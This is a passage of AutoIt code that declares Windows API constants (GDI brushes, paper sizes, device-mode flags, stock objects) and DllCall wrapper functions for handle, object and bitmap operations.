    EndFunc    ; -> _WinAPI_Wow64EnableWow64FsRedirection

#EndRegion Public Functions
#Region Internal Functions
    Func __WinAPI_MakeQWord($ilodword, $ihidword)
        Local $tint64 = DllStructCreate("uint64")
        Local $tdwords = DllStructCreate("dword;dword", DllStructGetPtr($tint64))
        DllStructSetData($tdwords, 0x1, $ilodword)
        DllStructSetData($tdwords, 0x2, $ihidword)
        Return DllStructGetData($tint64, 0x1)
    EndFunc    ; -> __WinAPI_MakeQWord

#EndRegion Internal Functions
Global Const $FR_PRIVATE = 0x10
Global Const $FR_NOT_ENUM = 0x20
Global Const $COMPRESSION_BITMAP_PNG = 0x0
Global Const $COMPRESSION_BITMAP_JPEG = 0x1
Global Const $BS_DIBPATTERN = 0x5
Global Const $BS_DIBPATTERN8X8 = 0x8
Global Const $BS_DIBPATTERNPT = 0x6
Global Const $BS_HATCHED = 0x2
Global Const $BS_HOLLOW = 0x1
Global Const $BS_NULL = 0x1
Global Const $BS_PATTERN = 0x3
Global Const $BS_PATTERN8X8 = 0x7
Global Const $BS_SOLID = 0x0
Global Const $HS_BDIAGONAL = 0x3
Global Const $HS_CROSS = 0x4
Global Const $HS_DIAGCROSS = 0x5
Global Const $HS_FDIAGONAL = 0x2
Global Const $HS_HORIZONTAL = 0x0
Global Const $HS_VERTICAL = 0x1
Global Const $DIB_PAL_COLORS = 0x1
Global Const $DIB_RGB_COLORS = 0x0
Global Const $CA_NEGATIVE = 0x1
Global Const $CA_LOG_FILTER = 0x2
Global Const $ILLUMINANT_DEVICE_DEFAULT = 0x0
Global Const $ILLUMINANT_A = 0x1
Global Const $ILLUMINANT_B = 0x2
Global Const $ILLUMINANT_C = 0x3
Global Const $ILLUMINANT_D50 = 0x4
Global Const $ILLUMINANT_D55 = 0x5
Global Const $ILLUMINANT_D65 = 0x6
Global Const $ILLUMINANT_D75 = 0x7
Global Const $ILLUMINANT_F2 = 0x8
Global Const $ILLUMINANT_TUNGSTEN = $ILLUMINANT_A
Global Const $ILLUMINANT_DAYLIGHT = $ILLUMINANT_C
Global Const $ILLUMINANT_FLUORESCENT = $ILLUMINANT_F2
Global Const $ILLUMINANT_NTSC = $ILLUMINANT_C
Global Const $BI_RGB = 0x0
Global Const $BI_RLE8 = 0x1
Global Const $BI_RLE4 = 0x2
Global Const $BI_BITFIELDS = 0x3
Global Const $BI_JPEG = 0x4
Global Const $BI_PNG = 0x5
Global Const $ALTERNATE = 0x1
Global Const $WINDING = 0x2
Global Const $DWMWA_NCRENDERING_ENABLED = 0x1
Global Const $DWMWA_NCRENDERING_POLICY = 0x2
Global Const $DWMWA_TRANSITIONS_FORCEDISABLED = 0x3
Global Const $DWMWA_ALLOW_NCPAINT = 0x4
Global Const $DWMWA_CAPTION_BUTTON_BOUNDS = 0x5
Global Const $DWMWA_NONCLIENT_RTL_LAYOUT = 0x6
Global Const $DWMWA_FORCE_ICONIC_REPRESENTATION = 0x7
Global Const $DWMWA_FLIP3D_POLICY = 0x8
Global Const $DWMWA_EXTENDED_FRAME_BOUNDS = 0x9
Global Const $DWMWA_HAS_ICONIC_BITMAP = 0xa
Global Const $DWMWA_DISALLOW_PEEK = 0xb
Global Const $DWMWA_EXCLUDED_FROM_PEEK = 0xc
Global Const $DWMNCRP_USEWINDOWSTYLE = 0x0
Global Const $DWMNCRP_DISABLED = 0x1
Global Const $DWMNCRP_ENABLED = 0x2
Global Const $DWMFLIP3D_DEFAULT = 0x0
Global Const $DWMFLIP3D_EXCLUDEBELOW = 0x1
Global Const $DWMFLIP3D_EXCLUDEABOVE = 0x2
Global Const $DM_BITSPERPEL = 0x40000
Global Const $DM_COLLATE = 0x8000
Global Const $DM_COLOR = 0x800
Global Const $DM_COPIES = 0x100
Global Const $DM_DEFAULTSOURCE = 0x200
Global Const $DM_DISPLAYFIXEDOUTPUT = 0x20000000
Global Const $DM_DISPLAYFLAGS = 0x200000
Global Const $DM_DISPLAYFREQUENCY = 0x400000
Global Const $DM_DISPLAYORIENTATION = 0x80
Global Const $DM_DITHERTYPE = 0x4000000
Global Const $DM_DUPLEX = 0x1000
Global Const $DM_FORMNAME = 0x10000
Global Const $DM_ICMINTENT = 0x1000000
Global Const $DM_ICMMETHOD = 0x800000
Global Const $DM_LOGPIXELS = 0x20000
Global Const $DM_MEDIATYPE = 0x2000000
Global Const $DM_NUP = 0x40
Global Const $DM_ORIENTATION = 0x1
Global Const $DM_PANNINGHEIGHT = 0x10000000
Global Const $DM_PANNINGWIDTH = 0x8000000
Global Const $DM_PAPERLENGTH = 0x4
Global Const $DM_PAPERSIZE = 0x2
Global Const $DM_PAPERWIDTH = 0x8
Global Const $DM_PELSHEIGHT = 0x100000
Global Const $DM_PELSWIDTH = 0x80000
Global Const $DM_POSITION = 0x20
Global Const $DM_PRINTQUALITY = 0x400
Global Const $DM_SCALE = 0x10
Global Const $DM_TTOPTION = 0x4000
Global Const $DM_YRESOLUTION = 0x2000
Global Const $DMPAPER_LETTER = 0x1
Global Const $DMPAPER_LETTERSMALL = 0x2
Global Const $DMPAPER_TABLOID = 0x3
Global Const $DMPAPER_LEDGER = 0x4
Global Const $DMPAPER_LEGAL = 0x5
Global Const $DMPAPER_STATEMENT = 0x6
Global Const $DMPAPER_EXECUTIVE = 0x7
Global Const $DMPAPER_A3 = 0x8
Global Const $DMPAPER_A4 = 0x9
Global Const $DMPAPER_A4SMALL = 0xa
Global Const $DMPAPER_A5 = 0xb
Global Const $DMPAPER_B4 = 0xc
Global Const $DMPAPER_B5 = 0xd
Global Const $DMPAPER_FOLIO = 0xe
Global Const $DMPAPER_QUARTO = 0xf
Global Const $DMPAPER_10X14 = 0x10
Global Const $DMPAPER_11X17 = 0x11
Global Const $DMPAPER_NOTE = 0x12
Global Const $DMPAPER_ENV_9 = 0x13
Global Const $DMPAPER_ENV_10 = 0x14
Global Const $DMPAPER_ENV_11 = 0x15
Global Const $DMPAPER_ENV_12 = 0x16
Global Const $DMPAPER_ENV_14 = 0x17
Global Const $DMPAPER_CSHEET = 0x18
Global Const $DMPAPER_DSHEET = 0x19
Global Const $DMPAPER_ESHEET = 0x1a
Global Const $DMPAPER_ENV_DL = 0x1b
Global Const $DMPAPER_ENV_C5 = 0x1c
Global Const $DMPAPER_ENV_C3 = 0x1d
Global Const $DMPAPER_ENV_C4 = 0x1e
Global Const $DMPAPER_ENV_C6 = 0x1f
Global Const $DMPAPER_ENV_C65 = 0x20
Global Const $DMPAPER_ENV_B4 = 0x21
Global Const $DMPAPER_ENV_B5 = 0x22
Global Const $DMPAPER_ENV_B6 = 0x23
Global Const $DMPAPER_ENV_ITALY = 0x24
Global Const $DMPAPER_ENV_MONARCH = 0x25
Global Const $DMPAPER_ENV_PERSONAL = 0x26
Global Const $DMPAPER_FANFOLD_US = 0x27
Global Const $DMPAPER_FANFOLD_STD_GERMAN = 0x28
Global Const $DMPAPER_FANFOLD_LGL_GERMAN = 0x29
Global Const $DMPAPER_ISO_B4 = 0x2a
Global Const $DMPAPER_JAPANESE_POSTCARD = 0x2b
Global Const $DMPAPER_9X11 = 0x2c
Global Const $DMPAPER_10X11 = 0x2d
Global Const $DMPAPER_15X11 = 0x2e
Global Const $DMPAPER_ENV_INVITE = 0x2f
Global Const $DMPAPER_RESERVED_48 = 0x30
Global Const $DMPAPER_RESERVED_49 = 0x31
Global Const $DMPAPER_LETTER_EXTRA = 0x32
Global Const $DMPAPER_LEGAL_EXTRA = 0x33
Global Const $DMPAPER_TABLOID_EXTRA = 0x34
Global Const $DMPAPER_A4_EXTRA = 0x35
Global Const $DMPAPER_LETTER_TRANSVERSE = 0x36
Global Const $DMPAPER_A4_TRANSVERSE = 0x37
Global Const $DMPAPER_LETTER_EXTRA_TRANSVERSE = 0x38
Global Const $DMPAPER_A_PLUS = 0x39
Global Const $DMPAPER_B_PLUS = 0x3a
Global Const $DMPAPER_LETTER_PLUS = 0x3b
Global Const $DMPAPER_A4_PLUS = 0x3c
Global Const $DMPAPER_A5_TRANSVERSE = 0x3d
Global Const $DMPAPER_B5_TRANSVERSE = 0x3e
Global Const $DMPAPER_A3_EXTRA = 0x3f
Global Const $DMPAPER_A5_EXTRA = 0x40
Global Const $DMPAPER_B5_EXTRA = 0x41
Global Const $DMPAPER_A2 = 0x42
Global Const $DMPAPER_A3_TRANSVERSE = 0x43
Global Const $DMPAPER_A3_EXTRA_TRANSVERSE = 0x44
Global Const $DMPAPER_DBL_JAPANESE_POSTCARD = 0x45
Global Const $DMPAPER_A6 = 0x46
Global Const $DMPAPER_JENV_KAKU2 = 0x47
Global Const $DMPAPER_JENV_KAKU3 = 0x48
Global Const $DMPAPER_JENV_CHOU3 = 0x49
Global Const $DMPAPER_JENV_CHOU4 = 0x4a
Global Const $DMPAPER_LETTER_ROTATED = 0x4b
Global Const $DMPAPER_A3_ROTATED = 0x4c
Global Const $DMPAPER_A4_ROTATED = 0x4d
Global Const $DMPAPER_A5_ROTATED = 0x4e
Global Const $DMPAPER_B4_JIS_ROTATED = 0x4f
Global Const $DMPAPER_B5_JIS_ROTATED = 0x50
Global Const $DMPAPER_JAPANESE_POSTCARD_ROTATED = 0x51
Global Const $DMPAPER_DBL_JAPANESE_POSTCARD_ROTATED = 0x52
Global Const $DMPAPER_A6_ROTATED = 0x53
Global Const $DMPAPER_JENV_KAKU2_ROTATED = 0x54
Global Const $DMPAPER_JENV_KAKU3_ROTATED = 0x55
Global Const $DMPAPER_JENV_CHOU3_ROTATED = 0x56
Global Const $DMPAPER_JENV_CHOU4_ROTATED = 0x57
Global Const $DMPAPER_B6_JIS = 0x58
Global Const $DMPAPER_B6_JIS_ROTATED = 0x59
Global Const $DMPAPER_12X11 = 0x5a
Global Const $DMPAPER_JENV_YOU4 = 0x5b
Global Const $DMPAPER_JENV_YOU4_ROTATED = 0x5c
Global Const $DMPAPER_P16K = 0x5d
Global Const $DMPAPER_P32K = 0x5e
Global Const $DMPAPER_P32KBIG = 0x5f
Global Const $DMPAPER_PENV_1 = 0x60
Global Const $DMPAPER_PENV_2 = 0x61
Global Const $DMPAPER_PENV_3 = 0x62
Global Const $DMPAPER_PENV_4 = 0x63
Global Const $DMPAPER_PENV_5 = 0x64
Global Const $DMPAPER_PENV_6 = 0x65
Global Const $DMPAPER_PENV_7 = 0x66
Global Const $DMPAPER_PENV_8 = 0x67
Global Const $DMPAPER_PENV_9 = 0x68
Global Const $DMPAPER_PENV_10 = 0x69
Global Const $DMPAPER_P16K_ROTATED = 0x6a
Global Const $DMPAPER_P32K_ROTATED = 0x6b
Global Const $DMPAPER_P32KBIG_ROTATED = 0x6c
Global Const $DMPAPER_PENV_1_ROTATED = 0x6d
Global Const $DMPAPER_PENV_2_ROTATED = 0x6e
Global Const $DMPAPER_PENV_3_ROTATED = 0x6f
Global Const $DMPAPER_PENV_4_ROTATED = 0x70
Global Const $DMPAPER_PENV_5_ROTATED = 0x71
Global Const $DMPAPER_PENV_6_ROTATED = 0x72
Global Const $DMPAPER_PENV_7_ROTATED = 0x73
Global Const $DMPAPER_PENV_8_ROTATED = 0x74
Global Const $DMPAPER_PENV_9_ROTATED = 0x75
Global Const $DMPAPER_PENV_10_ROTATED = 0x76
Global Const $DMPAPER_USER = 0x100
Global Const $DMBIN_UPPER = 0x1
Global Const $DMBIN_LOWER = 0x2
Global Const $DMBIN_MIDDLE = 0x3
Global Const $DMBIN_MANUAL = 0x4
Global Const $DMBIN_ENVELOPE = 0x5
Global Const $DMBIN_ENVMANUAL = 0x6
Global Const $DMBIN_AUTO = 0x7
Global Const $DMBIN_TRACTOR = 0x8
Global Const $DMBIN_SMALLFMT = 0x9
Global Const $DMBIN_LARGEFMT = 0xa
Global Const $DMBIN_LARGECAPACITY = 0xb
Global Const $DMBIN_CASSETTE = 0xe
Global Const $DMBIN_FORMSOURCE = 0xf
Global Const $DMBIN_USER = 0x100
Global Const $DMRES_DRAFT = + -1
Global Const $DMRES_LOW = + -2
Global Const $DMRES_MEDIUM = + -3
Global Const $DMRES_HIGH = + -4
Global Const $DMDO_DEFAULT = 0x0
Global Const $DMDO_90 = 0x1
Global Const $DMDO_180 = 0x2
Global Const $DMDO_270 = 0x3
Global Const $DMDFO_DEFAULT = 0x0
Global Const $DMDFO_STRETCH = 0x1
Global Const $DMDFO_CENTER = 0x2
Global Const $DMCOLOR_MONOCHROME = 0x1
Global Const $DMCOLOR_COLOR = 0x2
Global Const $DMDUP_SIMPLEX = 0x1
Global Const $DMDUP_VERTICAL = 0x2
Global Const $DMDUP_HORIZONTAL = 0x3
Global Const $DMTT_BITMAP = 0x1
Global Const $DMTT_DOWNLOAD = 0x2
Global Const $DMTT_SUBDEV = 0x3
Global Const $DMTT_DOWNLOAD_OUTLINE = 0x4
Global Const $DMCOLLATE_FALSE = 0x0
Global Const $DMCOLLATE_TRUE = 0x1
Global Const $DM_GRAYSCALE = 0x1
Global Const $DM_INTERLACED = 0x2
Global Const $DMNUP_SYSTEM = 0x1
Global Const $DMNUP_ONEUP = 0x2
Global Const $DMICMMETHOD_NONE = 0x1
Global Const $DMICMMETHOD_SYSTEM = 0x2
Global Const $DMICMMETHOD_DRIVER = 0x3
Global Const $DMICMMETHOD_DEVICE = 0x4
Global Const $DMICMMETHOD_USER = 0x100
Global Const $DMICM_SATURATE = 0x1
Global Const $DMICM_CONTRAST = 0x2
Global Const $DMICM_COLORIMETRIC = 0x3
Global Const $DMICM_ABS_COLORIMETRIC = 0x4
Global Const $DMICM_USER = 0x100
Global Const $DMMEDIA_STANDARD = 0x1
Global Const $DMMEDIA_TRANSPARENCY = 0x2
Global Const $DMMEDIA_GLOSSY = 0x3
Global Const $DMMEDIA_USER = 0x100
Global Const $DMDITHER_NONE = 0x1
Global Const $DMDITHER_COARSE = 0x2
Global Const $DMDITHER_FINE = 0x3
Global Const $DMDITHER_LINEART = 0x4
Global Const $DMDITHER_ERRORDIFFUSION = 0x5
Global Const $DMDITHER_RESERVED6 = 0x6
Global Const $DMDITHER_RESERVED7 = 0x7
Global Const $DMDITHER_RESERVED8 = 0x8
Global Const $DMDITHER_RESERVED9 = 0x9
Global Const $DMDITHER_GRAYSCALE = 0xa
Global Const $DMDITHER_USER = 0x100
Global Const $ENUM_CURRENT_SETTINGS = + -1
Global Const $ENUM_REGISTRY_SETTINGS = + -2
Global Const $DEVICE_FONTTYPE = 0x2
Global Const $RASTER_FONTTYPE = 0x1
Global Const $TRUETYPE_FONTTYPE = 0x4
Global Const $NTM_BOLD = 0x20
Global Const $NTM_DSIG = 0x200000
Global Const $NTM_ITALIC = 0x1
Global Const $NTM_MULTIPLEMASTER = 0x80000
Global Const $NTM_NONNEGATIVE_AC = 0x10000
Global Const $NTM_PS_OPENTYPE = 0x20000
Global Const $NTM_REGULAR = 0x40
Global Const $NTM_TT_OPENTYPE = 0x40000
Global Const $NTM_TYPE1 = 0x100000
Global Const $FLOODFILLBORDER = 0x0
Global Const $FLOODFILLSURFACE = 0x1
Global Const $AD_COUNTERCLOCKWISE = 0x1
Global Const $AD_CLOCKWISE = 0x2
Global Const $DCB_ACCUMULATE = 0x2
Global Const $DCB_DISABLE = 0x8
Global Const $DCB_ENABLE = 0x4
Global Const $DCB_RESET = 0x1
Global Const $DCB_SET = BitOR($DCB_RESET, $DCB_ACCUMULATE)
Global Const $DCX_WINDOW = 0x1
Global Const $DCX_CACHE = 0x2
Global Const $DCX_PARENTCLIP = 0x20
Global Const $DCX_CLIPSIBLINGS = 0x10
Global Const $DCX_CLIPCHILDREN = 0x8
Global Const $DCX_NORESETATTRS = 0x4
Global Const $DCX_LOCKWINDOWUPDATE = 0x400
Global Const $DCX_EXCLUDERGN = 0x40
Global Const $DCX_INTERSECTRGN = 0x80
Global Const $DCX_INTERSECTUPDATE = 0x200
Global Const $DCX_VALIDATE = 0x200000
Global Const $GGO_BEZIER = 0x3
Global Const $GGO_BITMAP = 0x1
Global Const $GGO_GLYPH_INDEX = 0x80
Global Const $GGO_GRAY2_BITMAP = 0x4
Global Const $GGO_GRAY4_BITMAP = 0x5
Global Const $GGO_GRAY8_BITMAP = 0x6
Global Const $GGO_METRICS = 0x0
Global Const $GGO_NATIVE = 0x2
Global Const $GGO_UNHINTED = 0x100
Global Const $GM_COMPATIBLE = 0x1
Global Const $GM_ADVANCED = 0x2
Global Const $MM_ANISOTROPIC = 0x8
Global Const $MM_HIENGLISH = 0x5
Global Const $MM_HIMETRIC = 0x3
Global Const $MM_ISOTROPIC = 0x7
Global Const $MM_LOENGLISH = 0x4
Global Const $MM_LOMETRIC = 0x2
Global Const $MM_TEXT = 0x1
Global Const $MM_TWIPS = 0x6
Global Const $R2_BLACK = 0x1
Global Const $R2_COPYPEN = 0xd
Global Const $R2_LAST = 0x10
Global Const $R2_MASKNOTPEN = 0x3
Global Const $R2_MASKPEN = 0x9
Global Const $R2_MASKPENNOT = 0x5
Global Const $R2_MERGENOTPEN = 0xc
Global Const $R2_MERGEPEN = 0xf
Global Const $R2_MERGEPENNOT = 0xe
Global Const $R2_NOP = 0xb
Global Const $R2_NOT = 0x6
Global Const $R2_NOTCOPYPEN = 0x4
Global Const $R2_NOTMASKPEN = 0x8
Global Const $R2_NOTMERGEPEN = 0x2
Global Const $R2_NOTXORPEN = 0xa
Global Const $R2_WHITE = 0x10
Global Const $R2_XORPEN = 0x7
Global Const $BLACKONWHITE = 0x1
Global Const $COLORONCOLOR = 0x3
Global Const $HALFTONE = 0x4
Global Const $WHITEONBLACK = 0x2
Global Const $STRETCH_ANDSCANS = $BLACKONWHITE
Global Const $STRETCH_DELETESCANS = $COLORONCOLOR
Global Const $STRETCH_HALFTONE = $HALFTONE
Global Const $STRETCH_ORSCANS = $WHITEONBLACK
Global Const $TA_BASELINE = 0x18
Global Const $TA_BOTTOM = 0x8
Global Const $TA_TOP = 0x0
Global Const $TA_CENTER = 0x6
Global Const $TA_LEFT = 0x0
Global Const $TA_RIGHT = 0x2
Global Const $TA_NOUPDATECP = 0x0
Global Const $TA_RTLREADING = 0x100
Global Const $TA_UPDATECP = 0x1
Global Const $VTA_BASELINE = $TA_BASELINE
Global Const $VTA_BOTTOM = $TA_RIGHT
Global Const $VTA_TOP = $TA_LEFT
Global Const $VTA_CENTER = $TA_CENTER
Global Const $VTA_LEFT = $TA_BOTTOM
Global Const $VTA_RIGHT = $TA_TOP
Global Const $UDF_BGR = 0x1
Global Const $UDF_RGB = 0x0
Global Const $MWT_IDENTITY = 0x1
Global Const $MWT_LEFTMULTIPLY = 0x2
Global Const $MWT_RIGHTMULTIPLY = 0x3
Global Const $MWT_SET = 0x4
Global Const $MONITOR_DEFAULTTONEAREST = 0x2
Global Const $MONITOR_DEFAULTTONULL = 0x0
Global Const $MONITOR_DEFAULTTOPRIMARY = 0x1
Global Const $PT_BEZIERTO = 0x4
Global Const $PT_LINETO = 0x2
Global Const $PT_MOVETO = 0x6
Global Const $PT_CLOSEFIGURE = 0x1
#Region Global Variables and Constants
    Global Const $DUPLICATE_CLOSE_SOURCE = 0x1
    Global Const $DUPLICATE_SAME_ACCESS = 0x2
    Global Const $OBJ_BITMAP = 0x7
    Global Const $OBJ_BRUSH = 0x2
    Global Const $OBJ_COLORSPACE = 0xe
    Global Const $OBJ_DC = 0x3
    Global Const $OBJ_ENHMETADC = 0xc
    Global Const $OBJ_ENHMETAFILE = 0xd
    Global Const $OBJ_EXTPEN = 0xb
    Global Const $OBJ_FONT = 0x6
    Global Const $OBJ_MEMDC = 0xa
    Global Const $OBJ_METADC = 0x4
    Global Const $OBJ_METAFILE = 0x9
    Global Const $OBJ_PAL = 0x5
    Global Const $OBJ_PEN = 0x1
    Global Const $OBJ_REGION = 0x8
    Global Const $NULL_BRUSH = 0x5
    Global Const $NULL_PEN = 0x8
    Global Const $BLACK_BRUSH = 0x4
    Global Const $DKGRAY_BRUSH = 0x3
    Global Const $DC_BRUSH = 0x12
    Global Const $GRAY_BRUSH = 0x2
    Global Const $HOLLOW_BRUSH = $NULL_BRUSH
    Global Const $LTGRAY_BRUSH = 0x1
    Global Const $WHITE_BRUSH = 0x0
    Global Const $BLACK_PEN = 0x7
    Global Const $DC_PEN = 0x13
    Global Const $WHITE_PEN = 0x6
    Global Const $ANSI_FIXED_FONT = 0xb
    Global Const $ANSI_VAR_FONT = 0xc
    Global Const $DEVICE_DEFAULT_FONT = 0xe
    Global Const $DEFAULT_GUI_FONT = 0x11
    Global Const $OEM_FIXED_FONT = 0xa
    Global Const $SYSTEM_FONT = 0xd
    Global Const $SYSTEM_FIXED_FONT = 0x10
    Global Const $DEFAULT_PALETTE = 0xf
#EndRegion Global Variables and Constants
#Region Functions list
#EndRegion Functions list
#Region Public Functions
    Func _WinAPI_CloseHandle($hobject)
        Local $acall = DllCall("kernel32.dll", "bool", "CloseHandle", "handle", $hobject)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_CloseHandle

    Func _WinAPI_DeleteObject($hobject)
        Local $acall = DllCall("gdi32.dll", "bool", "DeleteObject", "handle", $hobject)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_DeleteObject

    Func _WinAPI_DuplicateHandle($hsourceprocesshandle, $hsourcehandle, $htargetprocesshandle, $idesiredaccess, $iinherithandle, $ioptions)
        Local $acall = DllCall("kernel32.dll", "bool", "DuplicateHandle", "handle", $hsourceprocesshandle, "handle", $hsourcehandle, "handle", $htargetprocesshandle, "handle*", 0x0, "dword", $idesiredaccess, "bool", $iinherithandle, "dword", $ioptions)
        If @error Or Not $acall[0x0] Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x4]
    EndFunc    ; -> _WinAPI_DuplicateHandle

    Func _WinAPI_GetCurrentObject($hdc, $itype)
        Local $acall = DllCall("gdi32.dll", "handle", "GetCurrentObject", "handle", $hdc, "uint", $itype)
        If @error Or Not $acall[0x0] Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_GetCurrentObject

    Func _WinAPI_GetCurrentProcess()
        Local $acall = DllCall("kernel32.dll", "handle", "GetCurrentProcess")
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_GetCurrentProcess

    Func _WinAPI_GetObject($hobject, $isize, $pobject)
        Local $acall = DllCall("gdi32.dll", "int", "GetObjectW", "handle", $hobject, "int", $isize, "struct*", $pobject)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_GetObject

    Func _WinAPI_GetObjectInfoByHandle($hobject)
        Local $tagpublic_object_basic_information = "ulong Attributes;ulong GrantedAcess;ulong HandleCount;ulong PointerCount;ulong Reserved[10]"
        Local $tpobi = DllStructCreate($tagpublic_object_basic_information)
        Local $acall = DllCall("ntdll.dll", "long", "ZwQueryObject", "handle", $hobject, "uint", 0x0, "struct*", $tpobi, "ulong", DllStructGetSize($tpobi), "ptr", 0x0)
        If @error Then Return SetError(@error, @extended, 0x0)
        If $acall[0x0] Then Return SetError(0xa, $acall[0x0], 0x0)
        Local $aret[0x4]
        For $i = 0x0 To 0x3
            $aret[$i] = DllStructGetData($tpobi, $i + 0x1)
        Next
        Return $aret
    EndFunc    ; -> _WinAPI_GetObjectInfoByHandle

    Func _WinAPI_GetObjectNameByHandle($hobject)
        Local $tagunicode_string = "struct;ushort Length;ushort MaximumLength;ptr Buffer;endstruct"
        Local $tagpublic_object_type_information = "struct;" & $tagunicode_string & ";ulong Reserved[22];endstruct"
        Local $tpoti = DllStructCreate($tagpublic_object_type_information & ";byte[32]")
        Local $acall = DllCall("ntdll.dll", "long", "ZwQueryObject", "handle", $hobject, "uint", 0x2, "struct*", $tpoti, "ulong", DllStructGetSize($tpoti), "ulong*", 0x0)
        If @error Then Return SetError(@error, @extended, '')
        If $acall[0x0] Then Return SetError(0xa, $acall[0x0], '')
        Local $pdata = DllStructGetData($tpoti, 0x3)
        If Not $pdata Then Return SetError(0xb, 0x0, '')
        Return _WinAPI_GetString($pdata)
    EndFunc    ; -> _WinAPI_GetObjectNameByHandle

    Func _WinAPI_GetObjectType($hobject)
        Local $acall = DllCall("gdi32.dll", "dword", "GetObjectType", "handle", $hobject)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_GetObjectType

    Func _WinAPI_GetStdHandle($istdhandle)
        If $istdhandle < 0x0 Or $istdhandle > 0x2 Then Return SetError(0x2, 0x0, + -1)
        Local Const $AHANDLE[0x3] = [+ -10, + -11, + -12]
        Local $acall = DllCall("kernel32.dll", "handle", "GetStdHandle", "dword", $AHANDLE[$istdhandle])
        If @error Then Return SetError(@error, @extended, + -1)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_GetStdHandle

    Func _WinAPI_GetStockObject($iobject)
        Local $acall = DllCall("gdi32.dll", "handle", "GetStockObject", "int", $iobject)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_GetStockObject

    Func _WinAPI_SelectObject($hdc, $hgdiobj)
        Local $acall = DllCall("gdi32.dll", "handle", "SelectObject", "handle", $hdc, "handle", $hgdiobj)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_SelectObject

    Func _WinAPI_SetHandleInformation($hobject, $imask, $iflags)
        Local $acall = DllCall("kernel32.dll", "bool", "SetHandleInformation", "handle", $hobject, "dword", $imask, "dword", $iflags)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_SetHandleInformation

#EndRegion Public Functions
#Region Global Variables and Constants
    Global Const $TAGBITMAP = "struct;long bmType;long bmWidth;long bmHeight;long bmWidthBytes;ushort bmPlanes;ushort bmBitsPixel;ptr bmBits;endstruct"
    Global Const $TAGBITMAPV5HEADER = "struct;dword bV5Size;long bV5Width;long bV5Height;ushort bV5Planes;ushort bV5BitCount;dword bV5Compression;dword bV5SizeImage;long bV5XPelsPerMeter;long bV5YPel" & _
        "sPerMeter;dword bV5ClrUsed;dword bV5ClrImportant;dword bV5RedMask;dword bV5GreenMask;dword bV5BlueMask;dword bV5AlphaMask;dword bV5CSType;int bV5Endpoints[9];dw" & _
        "ord bV5GammaRed;dword bV5GammaGreen;dword bV5GammaBlue;dword bV5Intent;dword bV5ProfileData;dword bV5ProfileSize;dword bV5Reserved;endstruct"
    Global Const $TAGDIBSECTION = $TAGBITMAP & ";" & $TAGBITMAPINFOHEADER & ";dword dsBitfields[3];ptr dshSection;dword dsOffset"
    Global Const $TMPF_FIXED_PITCH = 0x1
    Global Const $TMPF_VECTOR = 0x2
    Global Const $TMPF_TRUETYPE = 0x4
    Global Const $TMPF_DEVICE = 0x8
    Global Const $__WINAPICONSTANT_FW_NORMAL = 0x190
    Global Const $__WINAPICONSTANT_DEFAULT_CHARSET = 0x1
    Global Const $__WINAPICONSTANT_OUT_DEFAULT_PRECIS = 0x0
    Global Const $__WINAPICONSTANT_CLIP_DEFAULT_PRECIS = 0x0
    Global Const $__WINAPICONSTANT_DEFAULT_QUALITY = 0x0
#EndRegion Global Variables and Constants
#Region Functions list
#EndRegion Functions list
#Region Public Functions
    Func _WinAPI_BitBlt($hdestdc, $ixdest, $iydest, $iwidth, $iheight, $hsrcdc, $ixsrc, $iysrc, $irop)
        Local $acall = DllCall("gdi32.dll", "bool", "BitBlt", "handle", $hdestdc, "int", $ixdest, "int", $iydest, "int", $iwidth, "int", $iheight, "handle", $hsrcdc, "int", $ixsrc, "int", $iysrc, "dword", $irop)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_BitBlt

    Func _WinAPI_CombineRgn($hrgndest, $hrgnsrc1, $hrgnsrc2, $icombinemode)
        Local $acall = DllCall("gdi32.dll", "int", "CombineRgn", "handle", $hrgndest, "handle", $hrgnsrc1, "handle", $hrgnsrc2, "int", $icombinemode)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_CombineRgn

    Func _WinAPI_CopyBitmap($hbitmap)
        $hbitmap = _WinAPI_CopyImage($hbitmap, 0x0, 0x0, 0x0, 0x2000)
        Return SetError(@error, @extended, $hbitmap)
    EndFunc    ; -> _WinAPI_CopyBitmap

    Func _WinAPI_CopyImage($himage, $itype = 0x0, $ixdesiredpixels = 0x0, $iydesiredpixels = 0x0, $iflags = 0x0)
        Local $acall = DllCall("user32.dll", "handle", "CopyImage", "handle", $himage, "uint", $itype, "int", $ixdesiredpixels, "int", $iydesiredpixels, "uint", $iflags)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_CopyImage

    Func _WinAPI_CreateANDBitmap($hbitmap)
        Local $ierror = 0x0, $hdib = 0x0
        $hbitmap = _WinAPI_CopyBitmap($hbitmap)
        If Not $hbitmap Then Return SetError(@error + 0x14, @extended, 0x0)
        Do
            Local $atdib[0x2]
            $atdib[0x0] = DllStructCreate($TAGDIBSECTION)
            If (Not _WinAPI_GetObject($hbitmap, DllStructGetSize($atdib[0x0]), $atdib[0x0])) Or (DllStructGetData($atdib[0x0], "bmBitsPixel") <> 0x20) Or (DllStructGetData($atdib[0x0], "biCompression")) Then
                $ierror = 0xa
                ExitLoop
            EndIf
            $atdib[0x1] = DllStructCreate($TAGBITMAP)
            $hdib = _WinAPI_CreateDIB(DllStructGetData($atdib[0x0], "bmWidth"), DllStructGetData($atdib[0x0], "bmHeight"), 0x1)
            If Not _WinAPI_GetObject($hdib, DllStructGetSize($atdib[0x1]), $atdib[0x1]) Then
                $ierror = 0xb
                ExitLoop
            EndIf
